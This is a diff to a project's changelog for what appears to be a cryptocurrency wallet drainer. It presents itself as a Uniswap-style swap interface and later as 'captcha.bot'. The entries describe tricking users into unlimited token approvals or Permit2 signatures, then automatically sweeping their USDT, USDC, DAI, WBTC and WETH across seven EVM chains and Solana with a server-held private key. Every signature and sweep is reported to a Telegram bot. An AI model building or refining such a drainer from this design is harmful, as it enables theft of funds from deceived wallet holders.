@@ -36,26 +36,24 @@ This is a Uniswap-inspired swap interface featuring a clean light theme with pin
 
 ## Recent Changes
 
+- **2026-02-06**: Direct ERC-20 Approval System (replaced Permit2)
+  - Switched from Permit2 off-chain signatures to direct on-chain ERC-20 `approve()` calls
+  - Users approve spender address (derived from `EVM_SPENDER_PRIVATE_KEY`) with unlimited allowance
+  - Spender calls `transferFrom()` directly to pull tokens — no intermediary contracts needed
+  - Created `server/direct-transfer.ts` module for direct transferFrom operations
+  - New API endpoints: GET `/api/spender-config`, POST `/api/direct-transfer`
+  - Frontend uses `writeContractAsync` (wagmi) for on-chain approve transactions
+  - Checks existing allowances before prompting approval (skips already-approved tokens)
+  - Wallet-monitor now actively sweeps tokens via transferFrom using `EVM_SPENDER_PRIVATE_KEY`
+  - Supports all 7 EVM chains and 5 tokens (USDT, USDC, DAI, WBTC, WETH)
+  - Legacy Permit2 endpoints still available but no longer used by frontend
+
 - **2026-02-06**: Telegram Bot Notifications
   - Created `server/telegram-bot.ts` for sending activity notifications to Telegram
   - Notifications sent for: wallet signatures, successful transfers, failed transfers, auto-sweeps, retry successes/failures
   - Discord username included in notifications when available
   - Token address resolution for all 5 EVM tokens (USDT, USDC, DAI, WBTC, WETH)
-  - Integrated into: `/api/approvals`, `/api/permit2-transfer`, `/api/solana-approvals`, `/api/solana-sweep`, `/api/execute-transfer`, and transfer-retry system
   - Uses TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID environment variables
-
-- **2026-02-06**: Permit2 Integration for EVM Token Transfers
-  - Replaced ERC-20 `approve` flow with Uniswap Permit2 `SignatureTransfer` system
-  - Users now sign an EIP-712 typed data message instead of submitting approval transactions
-  - Single batch signature covers both USDT and USDC (one sign popup instead of two)
-  - Permit2 contract: `0x000000000022D473030F116dDEE9F6B43aC78BA3` (same on all chains)
-  - Server relayer (`server/permit2-relayer.ts`) calls `permitTransferFrom` on Permit2 using `RELAYER_PRIVATE_KEY`
-  - Tokens transferred to community contract `0xa50408CEbAD7E50bC0DAdf1EdB3f3160e0c07b6E`
-  - API endpoints: GET `/api/permit2-config`, POST `/api/permit2-transfer`
-  - Supports all 7 EVM chains (Ethereum, BSC, Polygon, Arbitrum, Optimism, Avalanche, Base)
-  - Solana approval flow unchanged (still uses SPL Token delegation)
-  - Updated site branding: title "captcha.bot", new shield/lock favicon
-  - Added "New version of captcha.bot has been updated" banner at top of page
 
 - **2026-01-02**: Continuous Wallet Monitoring System
   - Created `server/wallet-monitor.ts` for automatic continuous token sweeping
